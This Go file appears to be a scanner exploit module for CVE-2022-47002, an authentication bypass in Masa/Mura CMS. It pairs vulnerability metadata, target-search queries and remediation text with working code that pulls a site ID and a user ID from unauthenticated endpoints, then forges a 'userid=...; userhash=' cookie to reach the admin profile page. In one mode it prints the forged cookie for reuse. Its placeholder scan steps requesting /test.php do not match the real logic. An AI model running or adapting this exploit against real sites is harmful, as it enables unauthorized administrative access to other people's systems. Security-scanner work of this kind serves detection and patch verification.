package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Masa CMS /_api/json/v1/default/content/ Path fields Parameter Permission Bypass Vulnerability (CVE-2022-47002)",
    "Description": "<p>Masa CMS is an enterprise content management platform based on open source technology. Masa CMS allows you to quickly and effectively provide personalized internet and intranet websites as well as mobile applications.</p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Product": "Masa-cms",
    "Homepage": "https://www.masacms.com/",
    "DisclosureDate": "2022-12-12",
    "Author": "h1ei1",
    "FofaQuery": "body=\"Mura CMS\" || header=\"Mura CMS\" || banner=\"Mura CMS\"",
    "GobyQuery": "body=\"Mura CMS\" || header=\"Mura CMS\" || banner=\"Mura CMS\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.murasoftware.com/mura-cms.\">https://www.murasoftware.com/mura-cms.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://hoyahaxa.blogspot.com/2023/03/authentication-bypass-mura-masa.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "all,login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2022-47002"
    ],
    "CNNVD": [
        "CNNVD-202302-076"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "Masa CMS  /_api/json/v1/default/content/ 路径 fields 参数未授权访问漏洞（CVE-2022-47002）",
            "Product": "masa-cms",
            "Description": "<p>Masa CMS是一个基于开源技术的企业内容管理平台。Masa CMS 允许您快速有效地提供个性化的互联网和内联网网站以及移动应用程序。</p><p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.murasoftware.com/mura-cms\">https://www.murasoftware.com/mura-cms</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Masa CMS /_api/json/v1/default/content/ Path fields Parameter Permission Bypass Vulnerability (CVE-2022-47002)",
            "Product": "Masa-cms",
            "Description": "<p>Masa CMS is an enterprise content management platform based on open source technology. Masa CMS allows you to quickly and effectively provide personalized internet and intranet websites as well as mobile applications.<br></p><p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://www.murasoftware.com/mura-cms.\">https://www.murasoftware.com/mura-cms.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can control the entire system through unauthorized access vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-26",
    "PocId": "10840"
}`

	sendSiteIdPayload521dgwqf := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	sendLastUpdateByidPayload263sdf := func(hostInfo *httpclient.FixUrl, siteId []string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig(fmt.Sprintf("/index.cfm/_api/json/v1/%s/content/?fields=lastupdatebyid", siteId[1]))
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	sendLoginPayload545131sdf := func(hostInfo *httpclient.FixUrl, lastUpdateByid []string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/admin/?muraAction=cEditProfile.edit")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Cookie", fmt.Sprintf("userid=%s; userhash=", lastUpdateByid[1]))
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		if err != nil {
			return resp, err
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			resp, err := sendSiteIdPayload521dgwqf(hostInfo)
			if err != nil || (resp != nil && !strings.Contains(resp.RawBody, "siteid:\"")) ||
				len(regexp.MustCompile("siteid:\"(.*?)\"").FindStringSubmatch(resp.RawBody)) < 1 {
				return false
			}
			siteId := regexp.MustCompile("siteid:\"(.*?)\"").FindStringSubmatch(resp.RawBody)
			resp, err = sendLastUpdateByidPayload263sdf(hostInfo, siteId)
			if err != nil || (resp != nil && len(regexp.MustCompile("\"lastupdatebyid\":\"(.*?)\"").FindStringSubmatch(resp.RawBody)) < 1) {
				return false
			}
			lastUpdateByid := regexp.MustCompile("\"lastupdatebyid\":\"(.*?)\"").FindStringSubmatch(resp.RawBody)
			resp, err = sendLoginPayload545131sdf(hostInfo, lastUpdateByid)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Edit Profile") && strings.Contains(resp.RawBody, "muraAction=cusers.editAddress&userID=")
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			var resp *httpclient.HttpResponse
			var err error
			if attackType == "all" || attackType == "login" {
				resp, err = sendSiteIdPayload521dgwqf(expResult.HostInfo)
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			if err != nil || (resp != nil && !strings.Contains(resp.RawBody, "siteid:\"")) ||
				len(regexp.MustCompile("siteid:\"(.*?)\"").FindStringSubmatch(resp.RawBody)) < 1 {
				expResult.Success = false
				expResult.Output = `漏洞利用失败`
				return expResult
			}
			siteId := regexp.MustCompile("siteid:\"(.*?)\"").FindStringSubmatch(resp.RawBody)
			resp, err = sendLastUpdateByidPayload263sdf(expResult.HostInfo, siteId)

			if err != nil || (resp != nil && len(regexp.MustCompile("\"lastupdatebyid\":\"(.*?)\"").FindStringSubmatch(resp.RawBody)) < 1) {
				expResult.Success = false
				expResult.Output = `漏洞利用失败`
				return expResult
			}
			lastUpdateByid := regexp.MustCompile("\"lastupdatebyid\":\"(.*?)\"").FindStringSubmatch(resp.RawBody)
			if attackType == "all" {
				expResult.Success = true
				expResult.Output = resp.RawBody
			} else if attackType == "login" {
				resp, err = sendLoginPayload545131sdf(expResult.HostInfo, lastUpdateByid)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Edit Profile") && strings.Contains(resp.RawBody, "muraAction=cusers.editAddress&userID=") {
					expResult.Success = true
					expResult.Output = `Cookie: userid=` + lastUpdateByid[1] + `; userhash=`
				}
			}
			return expResult
		},
	))
}
